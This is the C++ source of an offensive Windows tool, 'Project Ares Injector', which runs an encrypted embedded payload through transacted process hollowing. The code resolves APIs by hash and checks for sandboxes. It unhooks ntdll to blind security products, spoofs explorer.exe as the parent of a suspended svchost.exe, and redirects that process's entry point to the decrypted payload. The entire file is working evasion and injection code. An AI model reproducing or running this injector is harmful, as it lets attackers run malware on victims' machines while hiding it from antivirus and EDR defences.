/*
*	Project Ares Injector
*
*	AUTHOR: @Cerbersec - https://twitter.com/Cerbersec
*	VERSION: 1.0
* 
*	POWERED BY: Transacted Hollowing - https://github.com/hasherezade/transacted_hollowing	
*/

#include <windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <iostream>
#include "resource.h"
#include "headers.h"

#define CBC 1
#include "aes.h"
#include "pkcs7_padding.c"

unsigned int hash(const char* str) {
    unsigned int hash = 3482;
    int c;

    while (c = *str++)
        hash = ((hash << 5) + hash) + c;

    return hash;
}

PVOID GetNTDLLAddr() {
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
    PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
    PLIST_ENTRY listCurrent = listHead->Flink;
    PVOID NTDLLAddress = NULL;
    do
    {
        PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
        PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
        WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
        CharUpperA(dllName);
        if (hash(dllName) == 0xdb91a948)//C:\WINDOWS\SYSTEM32\NTDLL.DLL
        {
            NTDLLAddress = dllEntry->DllBase;
            HeapFree(GetProcessHeap(), 0, dllName);
            break;
        }
        HeapFree(GetProcessHeap(), 0, dllName);
        listCurrent = listCurrent->Flink;
    } while (listCurrent != listHead);
    return NTDLLAddress;
}

BOOL CheckSandbox(PNtDelayExecution fpNtDelayExecution) {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    if (systemInfo.dwNumberOfProcessors < 2)
        return TRUE;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    if (memoryStatus.ullTotalPhys / 1024 / 1024 < 2048)
        return TRUE;

    ULONG64 timeBeforeSleep = GetTickCount64();
    LARGE_INTEGER delay;
    delay.QuadPart = -10000 * 60000;
    fpNtDelayExecution(FALSE, &delay);
    ULONG64 timeAfterSleep = GetTickCount64();
    if (timeAfterSleep - timeBeforeSleep < 60000)
        return TRUE;

    return FALSE;
}

HANDLE GetParentHandle(PWSTR parent, PNtOpenProcess fpNtOpenProcess, PNtClose fpNtClose)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (wcscmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                fpNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                {
                    fpNtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    fpNtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    fpNtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if (!CreateProcessA(process, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    return pi;
}

BOOL Unhook(PVOID ntdllBaseAddr, PRtlInitUnicodeString fpRtlInitUnicodeString, PNtOpenFile fpNtOpenFile, PNtCreateSection fpNtCreateSection, PNtMapViewOfSection fpNtMapViewOfSection, PNtUnmapViewOfSection fpNtUnmapViewOfSection, PNtProtectVirtualMemory fpNtProtectVirtualMemory, PNtClose fpNtClose) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    const wchar_t* path = L"\\??\\C:\\Windows\\System32\\ntdll.dll";

    HANDLE hFile = NULL;

    UNICODE_STRING filePath;
    fpRtlInitUnicodeString(&filePath, (PCWSTR)path);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &filePath, OBJ_CASE_INSENSITIVE, 0, 0);

    IO_STATUS_BLOCK iostatus = { 0 };
    if(!NT_SUCCESS(fpNtOpenFile(&hFile, FILE_GENERIC_READ, &oa, &iostatus, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT)))
        return FALSE;

    HANDLE hSection = NULL;
    LARGE_INTEGER section_size;
    GetFileSizeEx(hFile, &section_size);
    if (!NT_SUCCESS(fpNtCreateSection(&hSection, SECTION_MAP_READ, NULL, (PLARGE_INTEGER)&section_size, PAGE_READONLY, SEC_IMAGE, hFile)))
        return FALSE;

    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;
    status = fpNtMapViewOfSection(hSection, (HANDLE)-1, &sectionBaseAddress, 0, 0, 0, &viewSize, ViewShare, 0, PAGE_READONLY);
    if (!NT_SUCCESS(status)) {
        if (status != STATUS_IMAGE_NOT_AT_BASE)
            return FALSE;
    }

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBaseAddr;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBaseAddr + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
            DWORD oldProtect = 0;
            SIZE_T textVirtualSize = hookedSectionHeader->Misc.VirtualSize;
            PVOID textVirtualAddr = (LPVOID)((DWORD_PTR)ntdllBaseAddr + (DWORD_PTR)hookedSectionHeader->VirtualAddress);
            if (!NT_SUCCESS(fpNtProtectVirtualMemory((HANDLE)-1, &textVirtualAddr, &textVirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect)))
                return FALSE;

            memcpy((LPVOID)((DWORD_PTR)ntdllBaseAddr + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)sectionBaseAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            if (!NT_SUCCESS(fpNtProtectVirtualMemory((HANDLE)-1, &textVirtualAddr, &textVirtualSize, oldProtect, &oldProtect)))
                return FALSE;
        }
    }

    fpNtUnmapViewOfSection((HANDLE)-1, sectionBaseAddress);
    fpNtClose(hFile);
    fpNtClose(hSection);
    hSection = NULL;
    hFile = NULL;
    return TRUE;
}

BOOL Cleanup(PNtClose fpNtClose, PNtResumeThread fpNtResumeThread, HANDLE hThread) {
    //resume remote thread even when fail condition, so we don't leave suspended process artifacts
    if (!NT_SUCCESS(fpNtResumeThread(hThread, NULL)))
        return TRUE;
    return FALSE;
}

int main()
{
    NTSTATUS status = STATUS_SUCCESS;
    PVOID ntdllBaseAddr = GetNTDLLAddr();

    PIMAGE_DOS_HEADER pDosH = (PIMAGE_DOS_HEADER)ntdllBaseAddr;
    PIMAGE_NT_HEADERS pNtH = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBaseAddr + pDosH->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOpH = (PIMAGE_OPTIONAL_HEADER) & (pNtH->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBaseAddr + pOpH->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)ntdllBaseAddr + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)ntdllBaseAddr + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)ntdllBaseAddr + pExportDirectory->AddressOfNameOrdinals);

    PNtOpenFile fpNtOpenFile = NULL;
    PNtCreateSection fpNtCreateSection = NULL;
    PNtMapViewOfSection fpNtMapViewOfSection = NULL;
    PNtUnmapViewOfSection fpNtUnmapViewOfSection = NULL;
    PNtAllocateVirtualMemory fpNtAllocateVirtualMemory = NULL;
    PNtWriteVirtualMemory fpNtWriteVirtualMemory = NULL;
    PNtProtectVirtualMemory fpNtProtectVirtualMemory = NULL;
    PNtCreateThreadEx fpNtCreateThreadEx = NULL;
    PNtClose fpNtClose = NULL;
    PRtlInitUnicodeString fpRtlInitUnicodeString = NULL;
    PNtDelayExecution fpNtDelayExecution = NULL;
    PNtOpenProcess fpNtOpenProcess = NULL;
    PNtCreateTransaction fpNtCreateTransaction = NULL;
    PRtlSetCurrentTransaction fpRtlSetCurrentTransaction = NULL;
    PNtCreateFile fpNtCreateFile = NULL;
    PNtWriteFile fpNtWriteFile = NULL;
    PNtRollbackTransaction fpNtRollbackTransaction = NULL;
    PNtGetContextThread fpNtGetContextThread = NULL;
    PNtSetContextThread fpNtSetContextThread = NULL;
    PNtResumeThread fpNtResumeThread = NULL;

    PNtReadVirtualMemory fpNtReadVirtualMemory = NULL;

    for (int i = 0; i < pExportDirectory->NumberOfNames; i++) {
        PCSTR pFunctionName = (PSTR)((PBYTE)ntdllBaseAddr + pAddressOfNames[i]);
        if (hash(pFunctionName) == 0x7be7c6ee) {
            fpNtOpenFile = (PNtOpenFile)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x41ee24c5) {
            fpNtCreateSection = (PNtCreateSection)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x3f0a953f) {
            fpNtMapViewOfSection = (PNtMapViewOfSection)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x1e09d9c2) {
            fpNtUnmapViewOfSection = (PNtUnmapViewOfSection)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x89beec41) {
            fpNtAllocateVirtualMemory = (PNtAllocateVirtualMemory)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x5aad6ca7) {
            fpNtWriteVirtualMemory = (PNtWriteVirtualMemory)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xe268c11d) {
            fpNtProtectVirtualMemory = (PNtProtectVirtualMemory)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x74cca3c5) {
            fpNtCreateThreadEx = (PNtCreateThreadEx)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xff37f232) {
            fpNtClose = (PNtClose)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xee71249e) {
            fpRtlInitUnicodeString = (PRtlInitUnicodeString)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xb4098adf) {
            fpNtDelayExecution = (PNtDelayExecution)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xca98430d) {
            fpNtOpenProcess = (PNtOpenProcess)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x4a47b676) {
            fpNtCreateTransaction = (PNtCreateTransaction)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x90864c1) {
            fpRtlSetCurrentTransaction = (PRtlSetCurrentTransaction)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x4faa6cf0) {
            fpNtCreateFile = (PNtCreateFile)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xb94d7827) {
            fpNtWriteFile = (PNtWriteFile)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xbbaeceec) {
            fpNtRollbackTransaction = (PNtRollbackTransaction)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xb9f99619) {
            fpNtGetContextThread = (PNtGetContextThread)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x4c775ca5) {
            fpNtSetContextThread = (PNtSetContextThread)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xf9a01685) {
            fpNtResumeThread = (PNtResumeThread)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x5b9b5958) {
            fpNtReadVirtualMemory = (PNtReadVirtualMemory)((PBYTE)ntdllBaseAddr + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }

    //check for sandbox
    printf("[+] Performing sandbox checks\n");
    if (CheckSandbox(fpNtDelayExecution))
        return 0;

    printf("[+] Sandbox checks passed\n");

    //unhook NTDLL
    if (!Unhook(ntdllBaseAddr, fpRtlInitUnicodeString, fpNtOpenFile, fpNtCreateSection, fpNtMapViewOfSection, fpNtUnmapViewOfSection, fpNtProtectVirtualMemory, fpNtClose)) {
        return 0;
    }

    printf("[+] Unhooked ntdll.dll\n");

    //load and decrypt payload from resources
    HRSRC rc = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L"PAYLOAD_BIN");
    DWORD rcSize = SizeofResource(NULL, rc);
    HGLOBAL rcData = LoadResource(NULL, rc);

    //MODIFY KEY WITH A 16 BYTE VALUE
    char* key = (char*)"16-byte-key-here";
    const uint8_t iv[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

    int blenu = rcSize;
    int klen = strlen(key);

    int klenu = klen;
    if (klen % 16)
        klenu += 16 - (klen % 16);

    uint8_t* keyarr = new uint8_t[klenu];
    ZeroMemory(keyarr, klenu);
    memcpy(keyarr, key, klen);

    uint8_t* bufarr = new uint8_t[blenu];
    ZeroMemory(bufarr, blenu);
    memcpy(bufarr, rcData, blenu);

    pkcs7_padding_pad_buffer(keyarr, klen, klenu, 16);

    AES_ctx ctx;
    AES_init_ctx_iv(&ctx, keyarr, iv);
    AES_CBC_decrypt_buffer(&ctx, bufarr, blenu);

    printf("[+] Decrypted payload with key: %s\n", keyarr);

    delete[] keyarr;

    //get parent proc
    HANDLE hParent = GetParentHandle((PWSTR)L"explorer.exe", fpNtOpenProcess, fpNtClose);
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    //spawn suspended process
    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"C:\\Windows\\System32\\svchost.exe", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;

    printf("[+] Spawned suspended process\n");

    //TRANSACTED HOLLOWING

    printf("[+] Starting injection\n[+] Creating transaction: ");
    //create transacted section
    HANDLE hTransaction = NULL;
    status = fpNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, NULL, NULL, NULL, 0, 0, 0, 0, NULL);
    printf("%llx\n", status);
    if(!NT_SUCCESS(status)) {
        Cleanup(fpNtClose, fpNtResumeThread, pi.hThread);
        return 0;
    }
    fpRtlSetCurrentTransaction(hTransaction);

    HANDLE hFileTransacted = NULL;
    OBJECT_ATTRIBUTES oat;
    UNICODE_STRING filename;
    IO_STATUS_BLOCK ioStatus1 = { 0 };

    wchar_t dn[MAX_PATH];
    wchar_t temp[MAX_PATH];
    GetTempPathW(MAX_PATH, temp);
    GetTempFileNameW(temp, L"TH", 0, dn);
    wchar_t temp_path[MAX_PATH] = L"\\??\\";
    wcscat_s((wchar_t*)temp_path, MAX_PATH, dn);
    fpRtlInitUnicodeString(&filename, temp_path);
    InitializeObjectAttributes(&oat, &filename, OBJ_CASE_INSENSITIVE, NULL, NULL);

    printf("[+] Creating transacted file: ");
    status = fpNtCreateFile(&hFileTransacted, STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | SYNCHRONIZE | FILE_READ_DATA | FILE_READ_ATTRIBUTES, &oat, &ioStatus1, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    printf("%llx\n", status);
    if(!NT_SUCCESS(status)) {
        Cleanup(fpNtClose, fpNtResumeThread, pi.hThread);
        return 0;
    }

    printf("[+] Writing payload: ");
    fpRtlSetCurrentTransaction(hTransaction);
    ZeroMemory(&ioStatus1, sizeof(IO_STATUS_BLOCK));
    status = fpNtWriteFile(hFileTransacted, NULL, NULL, NULL, &ioStatus1, bufarr, blenu, NULL, NULL);
    printf("%llx\n", status);
    if(!NT_SUCCESS(status)) {
        Cleanup(fpNtClose, fpNtResumeThread, pi.hThread);
        return 0;
    }

    printf("[+] Creating transacted section: ");
    HANDLE hSection = NULL;
    status = fpNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFileTransacted);
    printf("%llx\n", status);
    if(!NT_SUCCESS(status)) {
        Cleanup(fpNtClose, fpNtResumeThread, pi.hThread);
        return 0;
    }

    fpNtClose(hFileTransacted);
    fpNtRollbackTransaction(hTransaction, TRUE);
    fpNtClose(hTransaction);

    //map section in process
    PVOID sectionBaseAddress = 0;
    SIZE_T viewSize = 0;

    printf("[+] Mapping section in remote process: ");
    status = fpNtMapViewOfSection(hSection, pi.hProcess, &sectionBaseAddress, 0, 0, 0, &viewSize, ViewShare, 0, PAGE_READONLY);
    printf("%llx\n", status);
    if (!NT_SUCCESS(status)) {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            printf("Image not mapped at base -> payload relocations required\n");
        }
        else {
            Cleanup(fpNtClose, fpNtResumeThread, pi.hThread);
            return 0;
        }
    }

    fpNtClose(hSection);

    //redirect to payload
    //1. Calculate VA of payload's EntryPoint
    printf("[+] Performing offset calculations\n");
    PIMAGE_DOS_HEADER payloadDosHeader = (PIMAGE_DOS_HEADER)bufarr;
    PIMAGE_NT_HEADERS64 payloadNtHeaders64 = (PIMAGE_NT_HEADERS64)(bufarr + payloadDosHeader->e_lfanew);
    DWORD entrypoint = payloadNtHeaders64->OptionalHeader.AddressOfEntryPoint;
    ULONG64 entrypoint_va = (ULONG64)sectionBaseAddress + entrypoint;
    printf("[+] EntryPoint VA: 0x%llx\n", entrypoint_va);

    //2. Write the new EntryPoint into context of the remote process
    printf("[+] Overwriting remote entrypoint\n");
    CONTEXT context = { 0 };
    ZeroMemory(&context, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    status = fpNtGetContextThread(pi.hThread, &context);
    printf("[+] Fetching remote context: %llx\n", status);
    if (!NT_SUCCESS(status)) {
        Cleanup(fpNtClose, fpNtResumeThread, pi.hThread);
        return 0;
    }

    context.Rcx = entrypoint_va;
    status = fpNtSetContextThread(pi.hThread, &context);
    printf("[+] Setting remote context: %llx\n", status);
    if (!NT_SUCCESS(status)) {
        Cleanup(fpNtClose, fpNtResumeThread, pi.hThread);
        return 0;
    }

    //3. Get access to the remote PEB
    printf("[+] Updating remote PEB\n");
    ZeroMemory(&context, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    status = fpNtGetContextThread(pi.hThread, &context);
    printf("[+] Fetching remote context: %llx\n", status);
    ULONG64 remotePEBAddress = context.Rdx;
    printf("[+] Remote PEB is at: 0x%llx\n", remotePEBAddress);

    //get offset to PEB's ImageBase field
    LPVOID remoteImageBase = (LPVOID)(remotePEBAddress + (sizeof(ULONG64) * 2));
    printf("[+] Remote ImageBase at: 0x%llx\n", remoteImageBase);

    //4. Write the payload's ImageBase into remote process' PEB
    status = fpNtWriteVirtualMemory(pi.hProcess, remoteImageBase, &sectionBaseAddress, sizeof(ULONG64), NULL);
    printf("[+] Writing new ImageBase into remote PEB: %llx\n", status);
    if (!NT_SUCCESS(status)) {
        Cleanup(fpNtClose, fpNtResumeThread, pi.hThread);
        return 0;
    }

    printf("[+] Resume remote thread: ");
    //resume thread
    status = fpNtResumeThread(pi.hThread, NULL);
    printf("%llx\n", status);

    //cleanup
    delete[] bufarr;
    fpNtClose(pi.hThread);
    fpNtClose(pi.hProcess);
    printf("[+] Cleanup complete\n");
    return 0;
}